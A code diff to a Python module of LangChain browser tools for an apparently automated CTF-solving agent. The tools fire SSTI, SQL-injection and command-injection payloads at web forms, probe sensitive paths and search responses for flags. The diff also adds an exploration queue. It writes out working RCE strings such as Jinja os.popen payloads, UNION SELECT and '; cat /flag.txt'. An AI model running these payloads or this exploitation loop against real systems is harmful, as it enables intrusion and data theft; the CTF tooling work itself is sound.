@@ -1,7 +1,7 @@
 """LangChain tools for browser automation in CTF challenges."""
 
 import re
-from typing import TYPE_CHECKING
+from typing import TYPE_CHECKING, Any
 
 from langchain_core.tools import tool
 
@@ -28,12 +28,27 @@ _browser: "BrowserController | None" = None
 # Track which payload types have been run to prevent loops
 _executed_payload_types: set[str] = set()
 
+# Global exploration queue (managed by orchestrator, accessed by tools)
+_exploration_queue: list[dict[str, Any]] = []
+
 
 def set_browser_controller(browser: "BrowserController") -> None:
     """Set the global browser controller for tools."""
-    global _browser, _executed_payload_types
+    global _browser, _executed_payload_types, _exploration_queue
     _browser = browser
     _executed_payload_types = set()  # Reset on new session
+    _exploration_queue = []  # Reset exploration queue
+
+
+def set_exploration_queue(queue: list[dict[str, Any]]) -> None:
+    """Set the exploration queue from orchestrator state."""
+    global _exploration_queue
+    _exploration_queue = queue.copy()
+
+
+def get_exploration_queue() -> list[dict[str, Any]]:
+    """Get the current exploration queue."""
+    return _exploration_queue.copy()
 
 
 def get_browser() -> "BrowserController":
@@ -123,12 +138,12 @@ async def fill_input(selector: str, value: str, submit: bool = True) -> str:
         flag = detect_flag(html)
 
         if flag:
-            return f"Filled and submitted. FLAG FOUND: {flag}\n\nPage URL: {url}"
+            return f"FLAG FOUND: {flag}"
 
         # Strip HTML tags for cleaner output
         import re
         body_text = re.sub(r'<[^>]+>', ' ', html)
-        body_text = ' '.join(body_text.split())[:800]
+        body_text = ' '.join(body_text.split())
 
         # Check if page changed and has no input elements
         page_changed = url != original_url
@@ -150,23 +165,24 @@ async def fill_input(selector: str, value: str, submit: bool = True) -> str:
             except Exception:
                 pass
 
-        response_parts = [
-            f"Filled and submitted.",
-            f"",
-            f"=== COMMAND OUTPUT (READ THIS!) ===",
-            f"{body_text}",
-            f"===================================",
-            f"",
-            f"Page URL after submit: {url}",
-        ]
+        # Build response with clear output indication
+        if body_text.strip():
+            output = f"Output: {body_text}"
+
+            # Detect directory listing and add guidance to explore subdirectories
+            if re.search(r'drwx|total \d+', body_text):
+                # Find interesting directories in the listing
+                interesting_dirs = re.findall(r'(challenge|app|flag|ctf|secret|home)', body_text, re.IGNORECASE)
+                if interesting_dirs:
+                    unique_dirs = list(set(d.lower() for d in interesting_dirs))
+                    output += f"\n\n** IMPORTANT: Found important files/directories: {', '.join(unique_dirs)}. Try to explore each directory first and DON'T guess any filenames! **"
+        else:
+            # Show raw HTML when body text is empty (command may have failed or returned nothing)
+            output = f"Output: (empty - raw HTML: {html})\n** File may not exist. Try listing the directory first with 'ls -la /path' **"
 
         if navigated_back:
-            response_parts.append(f"")
-            response_parts.append(f"Auto-navigated back to: {browser.get_current_url()}")
-            response_parts.append(f"")
-            response_parts.append(f"Analyze the output above and use fill_input with your next command.")
-
-        return "\n".join(response_parts)
+            return f"{output}\n(navigated back)"
+        return output
 
     return result
 
@@ -183,42 +199,27 @@ async def get_page_state() -> str:
     if not browser.page:
         return "Error: Browser not initialized"
 
-    url = browser.get_current_url()
     title = await browser.page.title()
     elements = await extract_interactive_elements(browser.page)
     forms = await extract_forms(browser.page)
     hints = await extract_html_hints(browser.page)
     cookies = await browser.get_cookies()
 
-    # Format output
-    lines = [
-        f"URL: {url}",
-        f"Title: {title}",
-        f"\nForms ({len(forms)}):",
-    ]
+    # Concise format
+    lines = [f"Title: {title}"]
 
-    for form in forms:
-        lines.append(f"  - {form.get('selector')}: {form.get('method')} to {form.get('action')}")
-        for field in form.get('fields', []):
-            lines.append(f"    - {field.get('tag')} [{field.get('type')}]: name={field.get('name')}")
+    if forms:
+        lines.append("Forms: " + ", ".join(f"{f.get('selector')}({f.get('method')})" for f in forms))
 
-    lines.append(f"\nInteractive Elements ({len(elements)}):")
-    for elem in elements[:15]:  # Limit output
-        tag = elem.get('tag')
-        selector = elem.get('selector')
-        text = elem.get('text', '')[:30]
-        lines.append(f"  - <{tag}> {selector} : {text}")
+    if elements:
+        elem_strs = [f"<{e.get('tag')}>{e.get('selector')}" for e in elements]
+        lines.append("Elements: " + ", ".join(elem_strs))
 
-    if len(elements) > 15:
-        lines.append(f"  ... and {len(elements) - 15} more elements")
+    if hints:
+        lines.append("Hints: " + "; ".join(h for h in hints))
 
-    lines.append(f"\nHints ({len(hints)}):")
-    for hint in hints[:10]:
-        lines.append(f"  - {hint[:100]}")
-
-    lines.append(f"\nCookies ({len(cookies)}):")
-    for cookie in cookies:
-        lines.append(f"  - {cookie.get('name')}={cookie.get('value', '')[:30]}")
+    if cookies:
+        lines.append("Cookies: " + ", ".join(f"{c.get('name')}={c.get('value', '')}" for c in cookies))
 
     return "\n".join(lines)
 
@@ -273,7 +274,7 @@ async def check_for_flag() -> str:
         log_observation(f"FLAG FOUND: {flag}")
         return f"FLAG FOUND: {flag}"
 
-    return "No flag found in current page state."
+    return "No flag found."
 
 
 @tool
@@ -333,52 +334,23 @@ async def list_interactive_elements() -> str:
     visible = [e for e in elements if e.get("is_visible", True)]
     hidden = [e for e in elements if not e.get("is_visible", True)]
 
-    lines = [f"Found {len(elements)} interactive elements ({len(visible)} visible, {len(hidden)} hidden):\n"]
+    lines = []
 
-    # List visible elements
+    # Single-line format per element
     if visible:
-        lines.append("VISIBLE ELEMENTS:")
-        for i, elem in enumerate(visible, 1):
-            tag = elem.get("tag")
-            selector = elem.get("selector")
-            elem_type = elem.get("type", "")
-            text = elem.get("text", "")[:40]
-            name = elem.get("name", "")
+        lines.append("Visible:")
+        for e in visible:
+            name_part = f" name={e.get('name')}" if e.get("name") else ""
+            text_part = f" '{e.get('text', '')}'" if e.get("text") else ""
+            lines.append(f"  <{e.get('tag')}>{name_part} {e.get('selector')}{text_part}")
 
-            line = f"{i}. <{tag}>"
-            if elem_type:
-                line += f" type='{elem_type}'"
-            if name:
-                line += f" name='{name}'"
-            line += f"\n   Selector: {selector}"
-            if text:
-                line += f"\n   Text: '{text}'"
-            lines.append(line)
-
-    # List hidden elements separately (important for CTF)
     if hidden:
-        lines.append("\nHIDDEN ELEMENTS (may contain flags/hints):")
-        for i, elem in enumerate(hidden, 1):
-            tag = elem.get("tag")
-            selector = elem.get("selector")
-            elem_type = elem.get("type", "")
-            text = elem.get("text", "")[:40]
-            name = elem.get("name", "")
-            value = elem.get("value", "")[:40]
+        lines.append("Hidden:")
+        for e in hidden:
+            value_part = f" value={e.get('value', '')}" if e.get("value") else ""
+            lines.append(f"  <{e.get('tag')}> {e.get('selector')}{value_part}")
 
-            line = f"{i}. <{tag}>"
-            if elem_type:
-                line += f" type='{elem_type}'"
-            if name:
-                line += f" name='{name}'"
-            line += f"\n   Selector: {selector}"
-            if text:
-                line += f"\n   Text: '{text}'"
-            if value:
-                line += f"\n   Value: '{value}'"
-            lines.append(line)
-
-    return "\n".join(lines)
+    return "\n".join(lines) if lines else "No interactive elements found."
 
 
 @tool
@@ -393,21 +365,15 @@ async def get_network_traffic() -> str:
     browser = get_browser()
     traffic = browser.get_network_traffic()
 
-    lines = [
-        f"Network Requests ({len(traffic['requests'])}):",
-    ]
+    lines = []
+    for req in traffic["requests"][-10:]:
+        lines.append(f"{req.get('method')} {req.get('url')}")
 
-    for req in traffic["requests"][-20:]:  # Last 20
-        lines.append(f"  {req.get('method')} {req.get('url')[:80]}")
+    for resp in traffic["responses"][-10:]:
+        body = resp.get("body", "")
+        lines.append(f"[{resp.get('status')}] {resp.get('url')} {body}")
 
-    lines.append(f"\nNetwork Responses ({len(traffic['responses'])}):")
-    for resp in traffic["responses"][-20:]:
-        body_preview = resp.get("body", "")[:100]
-        lines.append(f"  [{resp.get('status')}] {resp.get('url')[:60]}")
-        if body_preview:
-            lines.append(f"       Body: {body_preview}...")
-
-    return "\n".join(lines)
+    return "\n".join(lines) if lines else "No network traffic captured."
 
 
 @tool
@@ -419,10 +385,6 @@ async def get_page_source() -> str:
     """
     browser = get_browser()
     html = await browser.get_page_content()
-
-    # Truncate if too long
-    if len(html) > 10000:
-        return html[:10000] + "\n\n... [truncated, total length: " + str(len(html)) + "]"
 
     return html
 
@@ -445,14 +407,9 @@ async def find_element_by_text(text: str) -> str:
     elements = await find_elements_by_text(browser.page, text)
 
     if not elements:
-        return f"No elements found containing text: '{text}'"
+        return f"No elements with '{text}'"
 
-    lines = [f"Elements containing '{text}':\n"]
-    for elem in elements:
-        lines.append(f"  <{elem.get('tag')}> {elem.get('selector')}")
-        lines.append(f"    Text: {elem.get('text', '')[:60]}")
-
-    return "\n".join(lines)
+    return "\n".join(f"<{e.get('tag')}> {e.get('selector')}" for e in elements)
 
 
 @tool
@@ -488,13 +445,13 @@ async def submit_form(form_selector: str) -> str:
                     await element.click()
                     await browser.page.wait_for_load_state("domcontentloaded", timeout=5000)
                     log_action("Form submitted", f"Using selector: {sel}")
-                    return f"Form submitted using {sel}. Current URL: {browser.get_current_url()}"
+                    return f"Submitted. URL: {browser.get_current_url()}"
             except Exception:
                 continue
 
         # Fallback: press Enter on the last input
-        result = await browser.press_key("Enter")
-        return f"Pressed Enter to submit form. {result}"
+        await browser.press_key("Enter")
+        return f"Submitted (Enter). URL: {browser.get_current_url()}"
 
     except Exception as e:
         return f"Error submitting form: {e}"
@@ -577,9 +534,9 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
                 findings.append("Python class introspection output detected")
                 interesting = True
                 # Extract the class dump
-                mro_match = re.search(r'\[.*?class.*?\]', html[:2000])
+                mro_match = re.search(r'\[.*?class.*?\]', html)
                 if mro_match:
-                    response_snippet = mro_match.group()[:500]
+                    response_snippet = mro_match.group()
 
         # Check for command execution output
         if "popen" in payload.lower() or "system" in payload.lower():
@@ -609,7 +566,7 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
             ls_match = re.search(r'(total \d+[\s\S]*?)(?:\n\n|\Z)', clean_html)
             if ls_match:
                 listing = ls_match.group(1).strip()
-                response_snippet = listing[:800]
+                response_snippet = listing
                 # Look for flag-related files in listing
                 flag_files = re.findall(r'[\w./-]*flag[\w./-]*', listing, re.IGNORECASE)
                 if flag_files:
@@ -631,8 +588,8 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
                 interesting_paths = [p for p in file_paths if 'flag' in p.lower() or '.txt' in p.lower()]
                 if interesting_paths:
                     unique_paths = list(set(interesting_paths))
-                    findings.append(f"INTERESTING FILES: {', '.join(unique_paths[:10])}")
-                    response_snippet = '\n'.join(unique_paths[:20])
+                    findings.append(f"INTERESTING FILES: {', '.join(unique_paths)}")
+                    response_snippet = '\n'.join(unique_paths)
 
         # File content (flag files often have specific patterns) - ONLY THIS IS CRITICAL
         if re.search(r'pico|ctf|flag|HTB|THM', html, re.IGNORECASE) and re.search(r'\{[^}]+\}', html):
@@ -658,7 +615,7 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
             clean_html = re.sub(r'<[^>]+>', ' ', html)
             env_match = re.search(r'((?:\w+=\S+\s*){1,20})', clean_html)
             if env_match and not response_snippet:
-                response_snippet = env_match.group(1)[:500]
+                response_snippet = env_match.group(1)
 
         # Config object dump - interesting but don't stop
         if re.search(r"SECRET_KEY|<Config|'SECRET'", html, re.IGNORECASE):
@@ -767,7 +724,7 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
             # Extract potential base64
             b64_match = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', html)
             if b64_match:
-                response_snippet = f"Base64 content: {b64_match.group()[:200]}..."
+                response_snippet = f"Base64 content: {b64_match.group()}"
 
     # Generic: check if page changed significantly
     if not findings and len(html) != len(original_html):
@@ -796,7 +753,7 @@ def _analyze_payload_response(payload: str, payload_type: str, html: str, origin
         "interesting": interesting,
         "critical": critical,
         "findings": findings,
-        "response_snippet": response_snippet[:500] if response_snippet else "",
+        "response_snippet": response_snippet if response_snippet else "",
     }
 
 
@@ -872,8 +829,9 @@ DO NOT call try_common_payloads again. Use fill_input with a custom payload NOW.
         "original_html_length": len(original_html),
     })
 
-    results = [f"Testing {len(payloads)} {payload_type} payloads on {input_selector}:\n"]
+    results = []
     interesting_findings = []
+    critical_found = False
 
     # Test all payloads
     for i, payload in enumerate(payloads, 1):
@@ -903,7 +861,7 @@ DO NOT call try_common_payloads again. Use fill_input with a custom payload NOW.
             # Get response with retry
             try:
                 html = await browser.get_page_content()
-            except Exception as e:
+            except Exception:
                 # If content fetch fails, wait and retry
                 await browser.page.wait_for_timeout(1000)
                 try:
@@ -918,7 +876,7 @@ DO NOT call try_common_payloads again. Use fill_input with a custom payload NOW.
             flag = detect_flag(html)
 
             if flag:
-                result = f"  [{i}/{len(payloads)}] Payload: {str(payload)[:50]}"
+                result = f"  [{i}/{len(payloads)}] Payload: {str(payload)}"
                 result += f"\n       *** FLAG FOUND: {flag} ***"
                 results.append(result)
                 _log_to_file("INFO", "FLAG_FOUND_PAYLOAD", f"Flag found with payload: {payload}", {
@@ -948,125 +906,75 @@ DO NOT call try_common_payloads again. Use fill_input with a custom payload NOW.
                 "response_snippet": analysis["response_snippet"],
             })
 
-            # Build result string
-            result = f"  [{i}/{len(payloads)}] Payload: {str(payload)[:50]}"
-            result += f"\n       URL: {url}"
-
+            # Only log findings (skip payloads with no results)
             if analysis["findings"]:
-                result += f"\n       >>> FINDINGS:"
-                for finding in analysis["findings"]:
-                    result += f"\n           - {finding}"
                 interesting_findings.append({
                     "payload": str(payload),
                     "findings": analysis["findings"],
                     "snippet": analysis["response_snippet"],
                 })
 
-            if analysis["response_snippet"]:
-                result += f"\n       Response snippet: {analysis['response_snippet'][:200]}..."
-
-            results.append(result)
-
-            # If critical finding, stop and report
+            # If critical finding, stop and return concise result
             if analysis["critical"]:
-                results.append(f"\n{'='*60}")
-                results.append(f"COMMAND EXECUTION CONFIRMED! YOU must now craft your own payloads!")
-                results.append(f"{'='*60}")
-                if payload_type == "ssti":
-                    results.append(f"\nNEXT ACTION: Use fill_input with this SSTI RCE payload:")
-                    results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('ls -la /').read()}}}}\")")
-                    results.append(f"\nThis will list files at root. Then based on what you see, use fill_input")
-                    results.append(f"to cat the flag file (e.g., cat /flag.txt)")
-                elif payload_type == "ssti_explore":
-                    results.append(f"\n*** IMPORTANT: Analyze the output above! ***")
-                    results.append(f"\nYou saw a directory listing. Now YOU must:")
-                    results.append(f"1. Look at the directories/files shown above")
-                    results.append(f"2. Identify interesting directories (challenge, app, flag, etc.)")
-                    results.append(f"3. Use fill_input to explore those directories:")
-                    results.append(f"   fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('ls -la /challenge').read()}}}}\")")
-                    results.append(f"4. When you find the flag file, read it:")
-                    results.append(f"   fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /challenge/flag').read()}}}}\")")
-                    results.append(f"\nDO NOT use try_common_payloads again! Use fill_input with YOUR OWN commands!")
-                elif payload_type == "sqli":
-                    results.append(f"\nNEXT ACTION: Use fill_input with UNION SELECT to extract data")
-                elif payload_type == "cmdi":
-                    results.append(f"\nNEXT ACTION: Use fill_input with: ; ls -la / to explore")
+                critical_found = True
+                # Build concise output with just the essential info
+                finding_summary = "; ".join(analysis["findings"])
+                results = [finding_summary]
 
-                # Navigate back so agent can continue exploiting
+                if analysis["response_snippet"]:
+                    results.append(f"Output: {analysis['response_snippet']}")
+
+                # Add one clear next action based on payload type
+                if payload_type == "ssti":
+                    results.append(f"Next: fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('ls -la /').read()}}}}\")")
+                elif payload_type == "ssti_explore":
+                    results.append(f"Next: fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}}}\")")
+                elif payload_type == "sqli":
+                    results.append(f"Next: fill_input('{input_selector}', \"' UNION SELECT NULL,NULL,NULL--\")")
+                elif payload_type == "cmdi":
+                    results.append(f"Next: fill_input('{input_selector}', \"; cat /flag.txt\")")
+
                 await browser.go_back()
                 await browser.page.wait_for_timeout(500)
-                results.append(f"\nReady at: {browser.get_current_url()}")
                 break
 
             # Go back for next payload
             await browser.go_back()
             await browser.page.wait_for_timeout(500)
 
-        except Exception as e:
-            results.append(f"  [{i}/{len(payloads)}] Payload {str(payload)[:30]}... Error: {e}")
+        except Exception:
             # Try to recover by navigating back to original page
             try:
                 await browser.navigate(original_url)
-                await browser.page.wait_for_timeout(500)
             except Exception:
-                pass  # If recovery fails, continue anyway
+                pass
 
-    # Summary of interesting findings
-    if interesting_findings:
-        results.append(f"\n{'='*60}")
-        results.append(f"EXPLORATION COMPLETE: {len(interesting_findings)} findings")
-        results.append(f"{'='*60}")
-
-        # Collect all discovered flag-related paths
+    # Summary (skip if critical finding already reported)
+    if interesting_findings and not critical_found:
+        # Collect findings and flag paths
+        all_findings = []
         flag_paths = []
-        all_snippets = []
-
-        for idx, finding in enumerate(interesting_findings, 1):
-            results.append(f"\n{idx}. {finding['payload'][:50]}...")
+        for finding in interesting_findings:
+            all_findings.extend(finding["findings"])
             for f in finding["findings"]:
-                results.append(f"   → {f}")
-                # Extract flag paths from findings
                 if "FLAG FILES" in f or "INTERESTING FILES" in f:
-                    paths = re.findall(r'/[\w./-]+', f)
-                    flag_paths.extend(paths)
-            if finding["snippet"]:
-                all_snippets.append(finding["snippet"])
-                results.append(f"   Output: {finding['snippet'][:400]}")
+                    flag_paths.extend(re.findall(r'/[\w./-]+', f))
 
-        # Provide specific exploitation guidance
-        if payload_type == "ssti_explore":
-            results.append(f"\n{'='*60}")
-            results.append("YOUR TURN: Use fill_input to read the flag!")
-            results.append(f"{'='*60}")
+        results = [f"Found {len(interesting_findings)} interesting responses: {'; '.join(all_findings)}"]
+        if flag_paths:
+            results.append(f"Flag paths: {', '.join(set(flag_paths))}")
+            results.append(f"Next: fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat {flag_paths[0]}').read()}}}}\")")
+        else:
+            results.append(f"Next: fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}}}\")")
+    elif not critical_found:
+        results = ["No vulnerabilities detected with tested payloads."]
 
-            if flag_paths:
-                # Suggest specific cat commands for discovered flag files
-                unique_paths = list(set(flag_paths))[:5]
-                results.append(f"\nDiscovered flag-related files: {', '.join(unique_paths)}")
-                results.append("\nTry these commands with fill_input:")
-                for path in unique_paths:
-                    results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat {path}').read()}}}}\")")
-            else:
-                results.append("\nNo specific flag files found. Try:")
-                results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}}}\")")
-                results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /app/flag').read()}}}}\")")
-                results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /flag').read()}}}}\")")
-
-            results.append("\nDO NOT run try_common_payloads again. Use fill_input NOW!")
-    else:
-        results.append(f"\n=== No significant findings detected ===")
-        if payload_type == "ssti_explore":
-            results.append("Try alternative RCE methods with fill_input:")
-            results.append(f"  fill_input('{input_selector}', \"{{{{cycler.__init__.__globals__.os.popen('ls -la /').read()}}}}\")")
-            results.append(f"  fill_input('{input_selector}', \"{{{{joiner.__init__.__globals__.os.popen('ls -la /').read()}}}}\")")
-
-    # Log final summary
+    # Log final summary (full result is logged separately by orchestrator's TOOL_RESULT)
     final_result = "\n".join(results)
     _log_to_file("INFO", "PAYLOAD_COMPLETE", f"Completed {payload_type} payload testing", {
         "selector": input_selector,
         "findings_count": len(interesting_findings),
-        "interesting_findings": interesting_findings,
-        "full_result": final_result,
+        "critical_found": critical_found,
     })
 
     return final_result
@@ -1125,16 +1033,10 @@ async def get_cookies() -> str:
     browser = get_browser()
     cookies = await browser.get_cookies()
 
-    lines = [f"Cookies ({len(cookies)}):\n"]
-    for cookie in cookies:
-        lines.append(f"  {cookie.get('name')}:")
-        lines.append(f"    Value: {cookie.get('value', '')}")
-        lines.append(f"    Domain: {cookie.get('domain', '')}")
-        lines.append(f"    Path: {cookie.get('path', '/')}")
-        lines.append(f"    HttpOnly: {cookie.get('httpOnly', False)}")
-        lines.append(f"    Secure: {cookie.get('secure', False)}")
+    if not cookies:
+        return "No cookies."
 
-    return "\n".join(lines)
+    return "\n".join(f"{c.get('name')}={c.get('value', '')}" for c in cookies)
 
 
 @tool
@@ -1148,14 +1050,9 @@ async def get_local_storage() -> str:
     storage = await browser.get_local_storage()
 
     if not storage:
-        return "localStorage is empty"
+        return "Empty."
 
-    lines = [f"localStorage ({len(storage)} items):\n"]
-    for key, value in storage.items():
-        value_str = str(value)[:100]
-        lines.append(f"  {key}: {value_str}")
-
-    return "\n".join(lines)
+    return "\n".join(f"{k}={str(v)}" for k, v in storage.items())
 
 
 @tool
@@ -1177,9 +1074,9 @@ async def try_sensitive_paths() -> str:
     base = f"{parsed.scheme}://{parsed.netloc}"
 
     paths = get_payloads("sensitive_paths")
-    results = ["Checking sensitive paths:\n"]
+    results = []
 
-    for path in paths[:10]:  # Check first 10
+    for path in paths:
         if isinstance(path, tuple):
             path = path[0]
 
@@ -1188,32 +1085,20 @@ async def try_sensitive_paths() -> str:
             await browser.navigate(full_url)
             html = await browser.get_page_content()
 
-            # Check for 404 indicators
-            is_404 = "404" in html[:500] or "not found" in html.lower()[:500]
-
-            result = f"  {path}: "
+            is_404 = "404" in html or "not found" in html.lower()
             if is_404:
-                result += "404 Not Found"
+                results.append(f"{path}: 404")
             else:
-                # Check for flag
                 from ..utils.flag_detector import detect_flag
                 flag = detect_flag(html)
                 if flag:
-                    result += f"FLAG FOUND: {flag}"
-                    results.append(result)
-                    return "\n".join(results) + f"\n\n*** FLAG: {flag} ***"
-                else:
-                    result += f"Found content ({len(html)} bytes)"
+                    return f"FLAG FOUND: {flag} at {path}"
+                results.append(f"{path}: {len(html)}b")
+        except Exception:
+            pass
 
-            results.append(result)
-
-        except Exception as e:
-            results.append(f"  {path}: Error - {e}")
-
-    # Navigate back to original
     await browser.navigate(base_url)
-
-    return "\n".join(results)
+    return "\n".join(results) if results else "No sensitive paths found."
 
 
 @tool
@@ -1232,6 +1117,89 @@ async def type_slowly(selector: str, text: str) -> str:
     browser = get_browser()
     result = await browser.type_text(selector, text)
     return result
+
+
+@tool
+def add_to_queue(target: str, item_type: str, reason: str, priority: int = 2) -> str:
+    """Add an item to the exploration queue for later investigation.
+
+    Use this to track interesting paths, files, or payloads you want to explore.
+    Items are automatically sorted by priority.
+
+    Args:
+        target: The path/file/URL to explore (e.g., "/challenge", "/flag.txt").
+        item_type: Type of item - "dir", "file", "path", "payload", or "url".
+        reason: Brief explanation of why this is interesting.
+        priority: 1=high (explore first), 2=medium, 3=low.
+
+    Returns:
+        Confirmation message with current queue status.
+    """
+    global _exploration_queue
+
+    # Check if already in queue
+    if any(item["target"] == target for item in _exploration_queue):
+        return f"'{target}' is already in the queue."
+
+    _exploration_queue.append({
+        "type": item_type,
+        "target": target,
+        "reason": reason,
+        "priority": priority,
+    })
+
+    # Sort by priority
+    _exploration_queue.sort(key=lambda x: x["priority"])
+
+    log_action("Queue Add", f"Added {item_type}: {target} (priority {priority})")
+    return f"Added '{target}' to queue. Queue now has {len(_exploration_queue)} items."
+
+
+@tool
+def remove_from_queue(target: str) -> str:
+    """Remove an item from the exploration queue after exploring it.
+
+    Call this after you've investigated an item and found nothing interesting,
+    or after you've fully explored it.
+
+    Args:
+        target: The target to remove from the queue.
+
+    Returns:
+        Confirmation message with remaining queue status.
+    """
+    global _exploration_queue
+
+    original_len = len(_exploration_queue)
+    _exploration_queue = [item for item in _exploration_queue if item["target"] != target]
+
+    if len(_exploration_queue) < original_len:
+        log_action("Queue Remove", f"Removed: {target}")
+        return f"Removed '{target}' from queue. {len(_exploration_queue)} items remaining."
+    else:
+        return f"'{target}' was not in the queue."
+
+
+@tool
+def view_queue() -> str:
+    """View all items in the exploration queue.
+
+    Use this to see what interesting things you've found that still need investigation.
+
+    Returns:
+        Formatted list of pending exploration items.
+    """
+    if not _exploration_queue:
+        return "Exploration queue is empty."
+
+    lines = [f"Exploration queue ({len(_exploration_queue)} items):"]
+    for i, item in enumerate(_exploration_queue, 1):
+        priority_label = {1: "HIGH", 2: "MED", 3: "LOW"}.get(item["priority"], "?")
+        lines.append(f"  {i}. [{priority_label}] {item['type']}: {item['target']}")
+        if item.get("reason"):
+            lines.append(f"      Why: {item['reason']}")
+
+    return "\n".join(lines)
 
 
 # Collect all tools
@@ -1257,4 +1225,7 @@ ALL_TOOLS = [
     get_local_storage,
     try_sensitive_paths,
     type_slowly,
+    add_to_queue,
+    remove_from_queue,
+    view_queue,
 ]
